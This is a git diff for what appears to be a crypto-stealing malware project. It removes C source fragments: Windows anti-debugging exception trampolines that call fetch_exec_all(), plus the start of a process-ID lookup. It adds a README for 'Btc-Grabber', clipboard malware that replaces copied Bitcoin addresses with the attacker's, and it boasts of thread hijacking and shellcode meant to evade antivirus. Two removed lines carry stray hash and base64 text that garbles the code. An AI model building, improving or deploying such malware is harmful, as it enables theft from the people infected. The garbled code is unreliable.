@@ -1,37 +1,10 @@
-#include <Windows.h>
-#include <TlHelp32.h>
-#include <Shlwapi.h>
-#include "resource.h"
-#pragma comment( lib, "shlwapi.lib")
+# Btc-Grabber
+* Btc Grabber is a technique used to steal Bitcoin by manipulating in clipboard it monitor the infected machine clipboard content for signs of a bitcoin address if any btc/crypto address was found it will replaces the copied bitcoin address with the attacker address .
+* with this technique millions of dollars in crypto get stolen every year according to security researchers .
+* i've implemented Thread Hijacking technique to make it more powerful and hard To detect from user or some anti viruses also i've used pure shellcode so it start executing it from the very beginning .
+* in the next updates i will add more powerful features to it .
+* also i will make a highly effective project to detect this technique and shut it down and counter feature to it and some user/kernel mode anti viruses
 
-void fetch_exec_all(void);
-void Trampoline2()
-{
-    __try
-    {
-        __asm int 3;
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER)
-    {
-        fetch_exec_all();6deaa9d3211c0e58dc1d417e95e3bb83288260e2
-    }b3BeN2Y4MTQ5NGMtMDk2Mi00OWZmLWFmN2UtOTUzNDk4ZDE4ZTE4Xg==
-}
-
-void Trampoline1()
-{
-    __try
-    {
-        __asm int 3;
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER)
-    {
-        Trampoline2();
-    }
-}
-
-DWORD GetPID(const char* pn)
-{
-    DWORD procId = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
     if (hSnap != INVALID_HANDLE_VALUE)
